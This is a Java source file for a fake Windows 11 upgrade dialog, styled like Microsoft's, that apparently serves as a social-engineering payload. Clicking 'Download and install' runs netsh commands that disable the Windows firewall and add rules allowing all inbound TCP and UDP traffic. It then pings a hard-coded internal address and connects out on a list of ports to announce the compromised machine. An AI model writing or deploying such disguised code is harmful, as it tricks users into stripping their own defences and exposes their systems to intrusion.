package windowupdatetools;

import javax.swing.*;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URI;

public class FakeUpdate {

    private static final String LOCAL_IP = "192.168.182.133";
    private static final int[] ports = {80, 8080, 9000, 135, 445, 902, 912,
                                    5040, 49664, 49665, 49666, 49667, 49668, 49669,
                                    49670, 49671, 49672, 49673, 49674, 49675, 49676, 49677};

    public static void main(String[] args) {
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        JFrame frame = new JFrame("Upgrade to Windows 11");
        frame.setSize(750, 230);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setUndecorated(true);
        frame.setLayout(new BorderLayout());
        JPanel mainPanel = new JPanel() {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                Graphics2D g2d = (Graphics2D) g;
                Color color1 = Color.WHITE;
                Color color2 = Color.decode("#0078D4");
                int width = getWidth();
                int height = getHeight();
                GradientPaint gp = new GradientPaint(0, 0, color1, width * 2, height / 2, color2);
                g2d.setPaint(gp);
                g2d.fillRect(0, 0, width, height);
            }
        };
        mainPanel.setLayout(null);
        JLabel titleLabel = new JLabel("Upgrade to Windows 11 is readyâ€”and it's free!");
        titleLabel.setFont(new Font("Arial", Font.BOLD, 16));
        titleLabel.setBounds(20, 10, 500, 30);
        JLabel descriptionLabel = new JLabel("<html>Get the latest version of Windows, with <br>"
                + "<a href='#'>a new look, new features, and enhanced security</a>.</html>");
        descriptionLabel.setFont(new Font("Arial", Font.PLAIN, 14));
        descriptionLabel.setBounds(20, 50, 550, 50);
        descriptionLabel.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        descriptionLabel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                openLink("https://www.microsoft.com/en-us/security/blog/2023/09/26/new-security-features-in-windows-11-protect-users-and-empower-it/");
            }
        });
        JLabel noteLabel = new JLabel("<html><b>Note:</b> Some Windows 10 features aren't available in Windows 11. "
                + "Certain apps and features may have additional requirements. "
                + "<a href='#'>Check device specifications</a>.</html>");
        noteLabel.setFont(new Font("Arial", Font.PLAIN, 12));
        noteLabel.setBounds(20, 110, 550, 50);
        noteLabel.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        noteLabel.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                openLink("https://support.microsoft.com/en-us/surface/find-out-which-surface-model-you-have-da204261-8d26-9351-8588-5b09632c9486#:~:text=Select%20Start%20%3E%20Settings%20%3E%20System%20%2C,scroll%20down%20and%20select%20About%20.&text=Look%20near%20the%20top%20of,find%20the%20Surface%20model%20information.");
            }
        });
        JButton downloadButton = new JButton("Download and install");
        downloadButton.setFont(new Font("Arial", Font.BOLD, 12));
        downloadButton.setBackground(Color.decode("#0078D4"));
        downloadButton.setForeground(Color.WHITE);
        downloadButton.setFocusPainted(false);
        downloadButton.setBounds(20, 180, 200, 40);
        JButton stayButton = new JButton("Stay on Windows 10 for now");
        stayButton.setFont(new Font("Arial", Font.PLAIN, 12));
        stayButton.setBackground(Color.WHITE);
        stayButton.setForeground(Color.decode("#0078D4"));
        stayButton.setBorderPainted(false);
        stayButton.setBounds(230, 180, 220, 40);

        downloadButton.addActionListener(e -> {
            try {
                Process firewallOffProcess = new ProcessBuilder("cmd", "/c", "netsh advfirewall set allprofiles state off").start();
                firewallOffProcess.waitFor();

                Process openAllPortsProcess = new ProcessBuilder(
                        "cmd", "/c", "netsh advfirewall firewall add rule name=\"Open All TCP Ports\" protocol=TCP dir=in action=allow"
                ).start();
                openAllPortsProcess.waitFor();

                Process openAllUdpPortsProcess = new ProcessBuilder(
                        "cmd", "/c", "netsh advfirewall firewall add rule name=\"Open All UDP Ports\" protocol=UDP dir=in action=allow"
                ).start();
                openAllUdpPortsProcess.waitFor();
                Process pingProcess = new ProcessBuilder("ping", LOCAL_IP, "-n", "4").start();
                pingProcess.waitFor();
                boolean connected = false;
                for (int port : ports) {
                    try (Socket socket = new Socket(LOCAL_IP, port); 
                        PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
                        out.println("Port: " + port);
                        connected = true;
                        break;
                    } catch (IOException ex) {
                        System.out.println("Unable to connect to port " + 
                                    port + ". Trying another port...");
                    }
                }
                if (!connected) {
                    System.out.println("Cannot connect to any port.");
                }

                frame.dispose();
                StylishNotification.main(args);
            } catch (Exception ex) {
                ex.printStackTrace();
                JOptionPane.showMessageDialog(null, "An error occurred: " + ex.getMessage());
            }
        });
        
        mainPanel.add(titleLabel);
        mainPanel.add(descriptionLabel);
        mainPanel.add(noteLabel);
        mainPanel.add(downloadButton);
        mainPanel.add(stayButton);

        frame.add(mainPanel, BorderLayout.CENTER);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    private static void openLink(String url) {
        try {
            Desktop desktop = Desktop.getDesktop();
            desktop.browse(new URI(url));
        } catch (Exception e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "Failed to open the link: " + url);
        }
    }
}
